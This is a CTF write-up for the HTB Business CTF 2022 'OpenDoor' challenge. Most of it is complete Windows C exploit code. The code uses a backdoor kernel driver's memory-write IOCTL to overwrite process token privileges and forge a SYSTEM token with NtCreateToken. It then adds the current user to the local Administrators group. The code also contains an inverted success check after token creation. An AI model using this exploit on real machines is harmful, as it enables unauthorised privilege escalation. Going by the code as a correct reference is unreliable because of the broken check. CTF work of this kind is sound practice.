# HTB Business CTF 2022 – OpenDoor challenge
The OpenDoor challenge provides an end-user account and the malicious kernel driver C source code. The code allows to determine:
- Driver Name
- CTL Codes for reading and writing arbitrary memory addresses
- Structures to be passed to the driver

Even if possibilities are endless, the attack should be quick and relatively easy due to the nature of CTF. The chosen path relied on token manipulation and overwriting `_SEP_TOKEN_PRIVILEGES` structure, effectively giving the process all possible privileges, including `SeCreateTokenPrivilege`, which in turns allows to create a new token, and run child process with such token.  

Alternatively, process could obtain other sensitive privileges such as `SeDebugPrivilege` and use it to elevate. Theoretically, any process can be manipulated this way, as any memory address can be written with the driver, but in practice, the code manipulated its own token, and then launched `net localgroup` command, adding current user to administrators.  

After a reboot, the machine was pwned (as regular user was added to admins), and the flag was read.  

The code is quite dirty, as for the CTF reliability is the lowest priority, and even if BSOD happens (it actually did at the first attempt), the machine can be easily reverted and attacked again.  

Code relies partly on Parvez Anwar research published on <https://www.greyhathacker.net/?p=1025>  

As a typical Frankenstein Code, it does not follow consistent naming convention, and error checking.  
Maybe some day I will polish it neatly.

```c
#include <tchar.h>
#include <Windows.h>

#pragma warning(disable:4313) //relaxed printf argument checking
#pragma warning(disable:4477) //relaxed printf argument checking
#pragma warning(disable:6273) //relaxed printf argument checking
#pragma warning(disable:6066) //relaxed printf argument checking

#pragma comment(lib, "ntdll.lib")

#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xc0000004L)
#define STATUS_SUCCESS  ((NTSTATUS)0x00000000L)

#define SIZE_1KB 1024

typedef unsigned __int64 QWORD;

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX
{
	PVOID Object;
	ULONG_PTR UniqueProcessId;
	ULONG_PTR HandleValue;
	ULONG GrantedAccess;
	USHORT CreatorBackTraceIndex;
	USHORT ObjectTypeIndex;
	ULONG HandleAttributes;
	ULONG Reserved;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX, *PSYSTEM_HANDLE_TABLE_ENTRY_INFO_EX;

typedef struct _SYSTEM_HANDLE_INFORMATION_EX
{
	ULONG_PTR NumberOfHandles;
	ULONG_PTR Reserved;
	SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX Handles[1];
} SYSTEM_HANDLE_INFORMATION_EX, *PSYSTEM_HANDLE_INFORMATION_EX;

typedef enum _SYSTEM_INFORMATION_CLASS
{
	SystemExtendedHandleInformation = 0x40,
} SYSTEM_INFORMATION_CLASS;

NTSYSCALLAPI
NTSTATUS
NTAPI
NtQuerySystemInformation(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
);

typedef struct _SID_BUILTIN
{
	UCHAR Revision;
	UCHAR SubAuthorityCount;
	SID_IDENTIFIER_AUTHORITY IdentifierAuthority;
	ULONG SubAuthority[2];
} SID_BUILTIN, *PSID_BUILTIN;

typedef struct _SID_INTEGRITY
{
	UCHAR Revision;
	UCHAR SubAuthorityCount;
	SID_IDENTIFIER_AUTHORITY IdentifierAuthority;
	ULONG SubAuthority[1];
} SID_INTEGRITY, *PSID_INTEGRITY;

typedef struct _UNICODE_STRING
{
	USHORT Length;
	USHORT MaximumLength;
	PWSTR Buffer;
} UNICODE_STRING;

typedef UNICODE_STRING* PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES
{
	ULONG Length;
	HANDLE RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG Attributes;
	PVOID SecurityDescriptor;
	PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;


NTSYSAPI
NTSTATUS
NTAPI
NtCreateToken(
	OUT PHANDLE TokenHandle,
	IN ACCESS_MASK DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes,
	IN TOKEN_TYPE TokenType,
	IN PLUID AuthenticationId,
	IN PLARGE_INTEGER ExpirationTime,
	IN PTOKEN_USER TokenUser,
	IN PTOKEN_GROUPS TokenGroups,
	IN PTOKEN_PRIVILEGES TokenPrivileges,
	IN PTOKEN_OWNER TokenOwner,
	IN PTOKEN_PRIMARY_GROUP TokenPrimaryGroup,
	IN PTOKEN_DEFAULT_DACL TokenDefaultDacl,
	IN PTOKEN_SOURCE TokenSource
);


typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO
{
	ULONG ProcessId;
	UCHAR ObjectTypeNumber;
	UCHAR Flags;
	USHORT Handle;
	QWORD Object;
	ACCESS_MASK GrantedAccess;
} SYSTEM_HANDLE, *PSYSTEM_HANDLE;


typedef struct _SYSTEM_HANDLE_INFORMATION
{
	ULONG NumberOfHandles;
	SYSTEM_HANDLE Handles[1];
} SYSTEM_HANDLE_INFORMATION, *PSYSTEM_HANDLE_INFORMATION;


PSYSTEM_HANDLE_INFORMATION_EX HNDGetHandleInformation(void)
{
	NTSTATUS Status;
	PSYSTEM_HANDLE_INFORMATION_EX pLocAllHandleInfo = NULL;
	ULONG ulAllocatedHandleInfoSize = 0;
	ULONG ulRealHandleInfoSize = 0;

	do
	{
		Status = NtQuerySystemInformation(
			SystemExtendedHandleInformation,
			pLocAllHandleInfo,
			ulAllocatedHandleInfoSize,
			&ulRealHandleInfoSize);
		if (STATUS_INFO_LENGTH_MISMATCH == Status)
		{
			if (pLocAllHandleInfo)
			{
				LocalFree(pLocAllHandleInfo);
			}
			ulAllocatedHandleInfoSize = ulRealHandleInfoSize + SIZE_1KB;
			//use returned value plus some space just in case.
			pLocAllHandleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)LocalAlloc(LPTR, ulAllocatedHandleInfoSize);
			if (NULL == (pLocAllHandleInfo))
			{
				wprintf(L"FATAL ERROR. Cannot allocate memory in %hs\r\n", __func__);
				_exit(ERROR_NOT_ENOUGH_MEMORY);
			}
		}
	}
	while (STATUS_INFO_LENGTH_MISMATCH == Status);
	return pLocAllHandleInfo; //free by caller
}


int AddAccountToAdminGroup(HANDLE hTokenElevated)
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	DWORD currentusersize;
	TCHAR currentuser[MAX_PATH];
	TCHAR netcommand[MAX_PATH];

	ZeroMemory(&si, sizeof(STARTUPINFO));
	ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
	si.cb = sizeof(STARTUPINFO);

	currentusersize = ARRAYSIZE(currentuser);

	if (!GetUserName(currentuser, &currentusersize))
	{
		_tprintf(_T("\n[-] Failed to obtain current username: %lu\n\n"), GetLastError());
		return -1;
	}

	_tprintf(_T("\n[*] Adding current user '%s' account to the local administrators group"), currentuser);

	_stprintf_s(netcommand, MAX_PATH, _T("net localgroup Administrators %s /add"), currentuser);

	if (!CreateProcessAsUser(
		hTokenElevated,
		NULL,
		netcommand,
		NULL,
		NULL,
		FALSE,
		CREATE_NEW_CONSOLE,
		NULL,
		NULL,
		&si,
		&pi))
	{
		_tprintf(_T("\n[-] Failed to execute command (%lu) Run exploit again\n\n"), GetLastError());
		_exit(-1);
	}
	_tprintf(_T("\n[+] Executed command successfully\n"));
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	return 0;
}


PTOKEN_PRIVILEGES SetPrivileges(void)
{
	PTOKEN_PRIVILEGES privileges;
	LUID luid;
	int NumOfPrivileges = 5;
	size_t nBufferSize;


	nBufferSize = sizeof(TOKEN_PRIVILEGES) + sizeof(LUID_AND_ATTRIBUTES) * NumOfPrivileges;
	(privileges) = LocalAlloc(LPTR, (nBufferSize));
	if (NULL == (privileges))
	{
		wprintf(L"FATAL ERROR. Cannot allocate memory in %hs\r\n", __func__);
		_exit(ERROR_NOT_ENOUGH_MEMORY);
	}

	privileges->PrivilegeCount = NumOfPrivileges;

	LookupPrivilegeValue(NULL, SE_TCB_NAME, &luid);
	privileges->Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	privileges->Privileges[0].Luid = luid;

	LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid);
	privileges->Privileges[1].Attributes = SE_PRIVILEGE_ENABLED;
	privileges->Privileges[1].Luid = luid;

	LookupPrivilegeValue(NULL, SE_ASSIGNPRIMARYTOKEN_NAME, &luid);
	privileges->Privileges[2].Attributes = SE_PRIVILEGE_ENABLED;
	privileges->Privileges[2].Luid = luid;

	LookupPrivilegeValue(NULL, SE_TAKE_OWNERSHIP_NAME, &luid);
	privileges->Privileges[3].Attributes = SE_PRIVILEGE_ENABLED;
	privileges->Privileges[3].Luid = luid;

	LookupPrivilegeValue(NULL, SE_IMPERSONATE_NAME, &luid);
	privileges->Privileges[4].Attributes = SE_PRIVILEGE_ENABLED;
	privileges->Privileges[4].Luid = luid;

	return privileges;
}


PSID GetLocalSystemSID()
{
	PSID psid = NULL;
	SID_IDENTIFIER_AUTHORITY sidAuth = SECURITY_NT_AUTHORITY;

	if (AllocateAndInitializeSid(&sidAuth, 1, SECURITY_LOCAL_SYSTEM_RID, 0, 0, 0, 0, 0, 0, 0, &psid) == FALSE)
	{
		_tprintf(_T("\n[-] AllocateAndInitializeSid failed %d\n"), GetLastError());
		_exit(-1);
	}
	return psid;
}


LPVOID GetInfoFromToken(HANDLE hToken, TOKEN_INFORMATION_CLASS type)
{
	DWORD dwLengthNeeded;
	LPVOID lpData;

	if (!GetTokenInformation(hToken, type, NULL, 0, &dwLengthNeeded) && GetLastError() != ERROR_INSUFFICIENT_BUFFER)
	{
		_tprintf(_T("\n[-] Failed to initialize GetTokenInformation %d"), GetLastError());
		_exit(-1);
	}

	lpData = (LPVOID)LocalAlloc(LPTR, dwLengthNeeded);
	GetTokenInformation(hToken, type, lpData, dwLengthNeeded, &dwLengthNeeded);

	return lpData;
}


QWORD TokenAddressCurrentProcess(HANDLE hProcess, DWORD MyProcessID)
{
	ULONG i;
	QWORD TokenAddress = 0;
	DWORD nSize = 4096;
	BOOL tProcess;
	HANDLE hToken;

	if ((tProcess = OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) == FALSE)
	{
		_tprintf(_T("\n[-] OpenProcessToken() failed (%d)\n"), GetLastError());
		return -1;
	}

	PSYSTEM_HANDLE_INFORMATION_EX pshi = HNDGetHandleInformation();

	_tprintf(_T("\n[i] Current process id %d and token handle value %u"), MyProcessID, hToken);

	for (i = 0; i < pshi->NumberOfHandles; i++)
	{
		if (pshi->Handles[i].UniqueProcessId == MyProcessID && (HANDLE)pshi->Handles[i].HandleValue == hToken)
		{
			TokenAddress = (QWORD)pshi->Handles[i].Object;
		}
	}

	LocalFree(pshi);
	return TokenAddress;
}


HANDLE CreateUserToken(HANDLE hToken)
{
	HANDLE hTokenElevated;
	NTSTATUS status;
	DWORD i;
	DWORD dwSize = 0;
	TOKEN_USER userToken;
	PTOKEN_PRIVILEGES privileges = NULL;
	PTOKEN_OWNER ownerToken = NULL;
	PTOKEN_GROUPS groups = NULL;
	PTOKEN_PRIMARY_GROUP primary_group = NULL;
	PTOKEN_DEFAULT_DACL default_dacl = NULL;
	PLUID pluidAuth;
	LARGE_INTEGER li;
	PLARGE_INTEGER pli;
	LUID authid = SYSTEM_LUID;
	LUID luid;
	PSID_AND_ATTRIBUTES pSid;
	SID_BUILTIN TkSidLocalAdminGroup = {1, 2, {0, 0, 0, 0, 0, 5}, {32, DOMAIN_ALIAS_RID_ADMINS}};
	SECURITY_QUALITY_OF_SERVICE sqos = {sizeof(sqos), SecurityImpersonation, SECURITY_STATIC_TRACKING, FALSE};
	OBJECT_ATTRIBUTES oa = {sizeof(oa), 0, 0, 0, 0, &sqos};
	TOKEN_SOURCE SourceToken = { {'!', '!', '!', '!', '!', '!', '!', '!'}, {0, 0} };
	SID_IDENTIFIER_AUTHORITY nt = SECURITY_NT_AUTHORITY;
	PSID lpSidOwner = NULL;
	SID_INTEGRITY IntegritySIDSystem = {1, 1, SECURITY_MANDATORY_LABEL_AUTHORITY, SECURITY_MANDATORY_SYSTEM_RID};

	groups = (PTOKEN_GROUPS)GetInfoFromToken(hToken, TokenGroups);
	primary_group = (PTOKEN_PRIMARY_GROUP)GetInfoFromToken(hToken, TokenPrimaryGroup);
	default_dacl = (PTOKEN_DEFAULT_DACL)GetInfoFromToken(hToken, TokenDefaultDacl);

	pSid = groups->Groups;

	for (i = 0; i < groups->GroupCount; i++, pSid++)
	{
		PISID piSid = (PISID)pSid->Sid;

		if (pSid->Attributes & SE_GROUP_INTEGRITY)
		{
			memcpy(pSid->Sid, &IntegritySIDSystem, sizeof(IntegritySIDSystem));
		}

		if (piSid->SubAuthority[piSid->SubAuthorityCount - 1] == DOMAIN_ALIAS_RID_USERS)
		{
			memcpy(piSid, &TkSidLocalAdminGroup, sizeof(TkSidLocalAdminGroup));
			// Found RID_USERS membership, overwrite with RID_ADMINS  
			pSid->Attributes = SE_GROUP_ENABLED;
		}
		else
		{
			pSid->Attributes &= ~SE_GROUP_USE_FOR_DENY_ONLY;
			pSid->Attributes &= ~SE_GROUP_ENABLED;
		}
	}

	pluidAuth = &authid;
	li.LowPart = 0xFFFFFFFF;
	li.HighPart = 0xFFFFFFFF;
	pli = &li;

	AllocateAndInitializeSid(&nt, 1, SECURITY_LOCAL_SYSTEM_RID, 0, 0, 0, 0, 0, 0, 0, &lpSidOwner);
	userToken.User.Sid = lpSidOwner;
	userToken.User.Attributes = 0;

	AllocateLocallyUniqueId(&luid);
	SourceToken.SourceIdentifier.LowPart = luid.LowPart;
	SourceToken.SourceIdentifier.HighPart = luid.HighPart;

	ownerToken = LocalAlloc(LPTR, (sizeof(PSID)));
	if (NULL == (ownerToken))
	{
		wprintf(L"FATAL ERROR. Cannot allocate memory in %hs\r\n", __func__);
		_exit(ERROR_NOT_ENOUGH_MEMORY);
	}
	ownerToken->Owner = GetLocalSystemSID();

	privileges = SetPrivileges();

	status = NtCreateToken(
		&hTokenElevated,
		TOKEN_ALL_ACCESS,
		&oa,
		TokenPrimary,
		pluidAuth,
		pli,
		&userToken,
		groups,
		privileges,
		ownerToken,
		primary_group,
		default_dacl,
		&SourceToken);

	if (status == STATUS_SUCCESS)
	{
		_tprintf(_T("\n[+] New token created successfully\n"));
		return hTokenElevated;
	}
	_tprintf(_T("\n[-] Failed to create new token %08x\n"), status);
	_exit(-1);
}


//copied from driver code
#define BKD_TYPE 31337
#define IOCTL_BKD_WWW CTL_CODE( BKD_TYPE, 0x900, METHOD_BUFFERED, FILE_ANY_ACCESS  )
#define IOCTL_BKD_RWW CTL_CODE( BKD_TYPE, 0x901, METHOD_BUFFERED, FILE_ANY_ACCESS  )
#define DRIVER_NAME "BKD"

//copied from driver code
typedef struct
{
	PVOID addr;
	unsigned long long value;
} BkdPl;

int main(int argc, char* argv[])
{
	QWORD TokenAddressTarget;
	QWORD SepPrivilegesOffset = 0x40; //hardcoded, good for ctf
	QWORD PresentByteOffset;
	QWORD EnableByteOffset;
	QWORD TokenAddress;
	HANDLE hDevice;
	TCHAR devhandle[MAX_PATH];
	DWORD dwRetBytes = 0;
	HANDLE hTokenCurrent;
	HANDLE hTokenElevate;

	BkdPl myBkd = {0};

	_tprintf(_T("-------------------------------------------------------------------\n"));
	_tprintf(_T("            Standard Chartered BKD exploit wuzzaaaa!               \n"));
	_tprintf(_T("-------------------------------------------------------------------\n"));

	TokenAddress = TokenAddressCurrentProcess(GetCurrentProcess(), GetCurrentProcessId());
	_tprintf(_T("\n[i] Address of current process token 0x%p"), TokenAddress);

	TokenAddressTarget = TokenAddress + SepPrivilegesOffset;
	_tprintf(_T("\n[i] Address of _SEP_TOKEN_PRIVILEGES 0x%p will be overwritten\n"), TokenAddressTarget);

	PresentByteOffset = TokenAddressTarget + 0x0;
	_tprintf(_T("[i] Present bits at 0x%p will be overwritten\n"), PresentByteOffset);

	EnableByteOffset = TokenAddressTarget + 0x8;
	_tprintf(_T("[i] Enabled bits at 0x%p will be overwritten"), EnableByteOffset);

	_tprintf(_T("\n[~] Press Enter to continue . . .\n"));
	(void)_gettchar();

	_stprintf_s(devhandle, MAX_PATH, _T("\\\\.\\%s"), _T("BKD")); //hardcoded driver name

	hDevice = CreateFile(
		devhandle,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		0,
		NULL);

	if (hDevice == INVALID_HANDLE_VALUE)
	{
		_tprintf(_T("\n[-] Open %s device failed\n\n"), devhandle);
		return -1;
	}

	_tprintf(_T("\n[+] Open %s device successful"), devhandle);

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hTokenCurrent))
	{
		_tprintf(_T("[-] Failed OpenProcessToken() %lu\n\n"), GetLastError());
		return -1;
	}
	_tprintf(_T("[+] OpenProcessToken() handle opened successfully"));
	_tprintf(_T("\n[*] Overwriting _SEP_TOKEN_PRIVILEGES bits"));

	myBkd.addr = (PVOID)PresentByteOffset;
	myBkd.value = 0xFFFFFFFFFFFFFFFF;
	DeviceIoControl(hDevice, IOCTL_BKD_WWW, &myBkd, sizeof(myBkd), NULL, 0, &dwRetBytes, NULL);

	myBkd.addr = (PVOID)EnableByteOffset;
	myBkd.value = 0xFFFFFFFFFFFFFFFF;
	DeviceIoControl(hDevice, IOCTL_BKD_WWW, &myBkd, sizeof(myBkd), NULL, 0, &dwRetBytes, NULL);

	hTokenElevate = CreateUserToken(hTokenCurrent);
	if (hTokenElevate != NULL)
	{
		_tprintf(_T("[-] Failed to get token %lu\n\n"), GetLastError());
		_exit(-1);
	}
	_tprintf(_T("\n[+] Got token!"));

	AddAccountToAdminGroup(hTokenElevate);
	CloseHandle(hDevice);
	return 0;
}
```
